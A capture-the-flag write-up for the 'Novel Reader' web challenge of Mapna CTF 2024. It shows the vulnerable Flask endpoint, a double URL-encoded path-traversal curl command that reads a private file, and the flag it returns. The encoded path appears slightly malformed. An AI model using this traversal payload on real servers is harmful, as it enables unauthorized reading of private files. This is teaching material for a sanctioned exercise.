# Novel Reader (web) from Mapna CTF 2024

Here is my writeup of how I solved Novel Reader from Mapna CTF 2024.

Firstly, we look at the source code defining the /api/read endpoint. We see that we are able to specify a path name. This makes me think this is an LFI challenge. This is when we exploit the fact that every directory has a .. directory that points to the parent directory. 
```
@app.get('/api/read/<path:name>')
def readNovel(name):
    name = unquote(name)
    if(not name.startswith('public/')):
        return {'success': False, 'msg': 'You can only read public novels!'}, 400
    buf = readFile(name).split(' ')
    buf = ' '.join(buf[0:session['words_balance']])+'... Charge your account to unlock more of the novel!'
    return {'success': True, 'msg': buf}
```
We add a couple "../"s to get to a parent directory before adding /private/A-Secret-Tale.txt to our URL to get the contents of the A-Secret-Tale.txt file. I used curl to pass in our cookie (called session) and to get the contents of the URL we specified. One more thing I learned is that URLs are encoded in a certain way. This means we can't have . or / in our URL like we usually do. All I had to do was run our URL through a URL encoder twice to get the following command
```
curl -b "session=[insert a long string of letter and numbers that our session cookie is set to]" http://3.64.250.135:9000/api/read/public/%252F%252E%252E%252F%private%252FA-Secret-Tale.txt
```
This returns the contents of A-Secret-Tale.txt along with the string '... Charge your account to unlock more of the novel!' concatenated to our flag
```
{"msg": "Once upon a time there was a flag. The flag was read like this: MAPNA{uhhh-y0u-607-m3-4641n-3f4b38571}.... Charge your account to unlock more of the novel!", "success":true}
```

